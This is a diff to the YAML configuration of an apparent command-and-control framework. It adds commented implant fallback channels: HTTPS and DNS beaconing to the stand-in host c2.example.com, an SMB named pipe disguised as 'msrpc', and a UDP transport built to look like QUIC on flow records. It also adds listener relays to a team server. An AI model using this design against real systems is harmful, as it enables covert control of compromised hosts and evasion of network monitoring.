@@ -91,6 +91,10 @@ c2:
     max_restarts: 0
 
   # ── Fallback: Custom Python beacon (if Sliver binary unavailable) ──
+  #
+  # THIS HOST AS A CLIENT. Every block below describes a channel the implant
+  # running here will try, in this order, until one answers. Do not confuse it
+  # with `c2.listeners` further down, which opens sockets instead.
   fallback:
     enabled: true
     https:
@@ -98,9 +102,25 @@ c2:
       callback_url: "https://c2.example.com/api/v1/beacon"
       verify_ssl: false
     dns:
+      # Tasking only. Nothing registers over DNS and no result ever comes
+      # back over it, so a task delivered this way is fire-and-forget: it
+      # leaves the queue on delivery and its outcome is never reported.
+      # Useful as a last resort for a host that can still resolve names.
       enabled: true
       domain: "c2.example.com"
       resolver: "8.8.8.8"
+    smb:
+      # Bidirectional, including registration. `server` is host:port; 445 is
+      # the default and needs no port. Reaches an SMB listener (see
+      # c2.listeners), not a Windows file server.
+      enabled: false
+      server: ""
+      pipe_name: "msrpc_6e2f"
+    quic:
+      # UDP, bidirectional. Not real QUIC: a length-prefixed framing over
+      # datagrams that looks like it on a flow record, which is the point.
+      enabled: false
+      server: ""
 
   beacon_interval_seconds: 300
   jitter_percent: 20
@@ -110,6 +130,49 @@ c2:
   # without a valid one. There is no default.
   # Generate with: python3 -c "import os,base64; print(base64.b64encode(os.urandom(32)).decode())"
   encryption_key: ""
+
+  # ── Listeners: sockets THIS HOST OPENS for beacons to reach ──
+  #
+  # THIS HOST AS A SERVER, and the opposite of `c2.fallback` above. A listener
+  # is a separate process that relays opaque ciphertext to the team server's
+  # agent socket and the answer back; it never holds the encryption key, which
+  # is why it can sit on a cheap forwarding host.
+  #
+  # All three ship disabled. A fresh checkout opens no socket nobody asked
+  # for, and a listener block is validated even while disabled, so a typo
+  # surfaces now rather than on the day somebody switches it on.
+  #
+  # `relay_url` is the team server's beacon socket. The DNS listener is the
+  # exception: it takes the socket root, because it reads tasking from
+  # /api/v1/dns/<id> and needs the listener token to do it. That token is a
+  # shared secret and is deliberately not in this file -- it comes from the
+  # environment, like the agent token.
+  listeners:
+    - name: smb-445
+      transport: smb
+      enabled: false
+      bind_host: "0.0.0.0"
+      bind_port: 445
+      relay_url: "http://127.0.0.1:8443/api/v1/beacon"
+      settings:
+        pipe_name: "msrpc_6e2f"
+    - name: quic-8445
+      transport: quic
+      enabled: false
+      bind_host: "0.0.0.0"
+      # Not 8443: that is the team server's own beacon socket. UDP and TCP
+      # would not actually collide, but an example that reads as a conflict
+      # is an example somebody copies.
+      bind_port: 8445
+      relay_url: "http://127.0.0.1:8443/api/v1/beacon"
+    - name: dns-53
+      transport: dns
+      enabled: false
+      bind_host: "0.0.0.0"
+      bind_port: 53
+      relay_url: "http://127.0.0.1:8443"
+      settings:
+        zone: "c2.example.com"
 
   # ── Egress proxy (Python fallback beacon) ──
   proxy:
